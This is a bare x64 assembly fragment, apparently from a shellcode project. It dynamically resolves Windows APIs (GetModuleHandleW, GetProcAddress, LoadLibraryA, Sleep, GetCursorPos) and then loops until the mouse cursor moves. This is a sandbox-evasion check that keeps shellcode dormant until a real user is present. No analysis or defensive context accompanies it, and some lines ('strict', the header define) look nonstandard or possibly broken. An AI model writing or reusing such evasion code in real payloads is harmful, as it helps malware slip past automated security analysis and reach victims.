%define ASSEMBLER a.

    lea rcx, [KRN]
    call ShellcodeData.Labels.GetModuleHandleW
    test rax, rax
    strict
    jz ret
    mov rcx, rax
    push rcx
    lea rdx, [SLP]
    call ShellcodeData.Labels.GetProcAddress
    test rax, rax
    strict
    jz ret
    mov r13, rax
    pop rcx
    lea rdx, [LLA]
    call ShellcodeData.Labels.GetProcAddress
    test rax, rax
    strict
    jz ret
    mov rcx, rsp
    and rcx, 0b1111
    add rcx, 8
    sub rsp, rcx
    push rcx
    lea rcx, [USR]
    sub rsp, 0x20
    call rax
    add rsp, 0x20
    pop rcx
    add rsp, rcx
    test rax, rax
    strict
    jz ret
    mov rcx, rax
    lea rdx, [GCP]
    call ShellcodeData.Labels.GetProcAddress
    test rax, rax
    strict
    jz ret
    mov r12, rax
    mov rcx, rsp
    and rcx, 0b1111
    add rcx, 8
    sub rsp, rcx
    push rcx
    lea rcx, [PT]
    sub rsp, 0x20
    call r12
    add rsp, 0x20
    pop rcx
    add rsp, rcx
    test rax, rax
    strict
    jz ret
    mov r14, [PT]

_loop:
    mov rcx, rsp
    and rcx, 0b1111
    add rcx, 8
    sub rsp, rcx
    push rcx
    mov ecx, 5
    sub rsp, 0x20
    call r13
    add rsp, 0x20
    pop rcx
    add rsp, rcx
    mov rcx, rsp
    and rcx, 0b1111
    add rcx, 8
    sub rsp, rcx
    push rcx
    lea rcx, [PT]
    sub rsp, 0x20
    call r12
    add rsp, 0x20
    pop rcx
    add rsp, rcx
    test rax, rax
    strict
    jz _loop
    cmp r14, [PT]
    strict
    jz _loop